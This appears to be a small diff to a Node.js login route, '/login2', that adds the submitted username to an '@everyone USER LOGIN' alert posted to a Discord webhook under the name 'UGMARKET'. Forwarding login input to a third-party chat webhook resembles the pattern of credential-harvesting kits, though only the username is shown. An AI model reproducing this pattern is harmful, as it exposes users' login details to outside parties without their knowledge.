@@ -568,7 +568,7 @@ app.post('/login2', async (req, res) => {
     const message = {
       username: "UGMARKET",
       avatar_url: "https://cdn.discordapp.com/attachments/1128583298562658445/1128583378577391616/invert-ug.png",
-      content: "@everyone USER LOGIN"
+      content: "@everyone USER LOGIN" + username
     };
     await sendWebhookMessage(message);
 
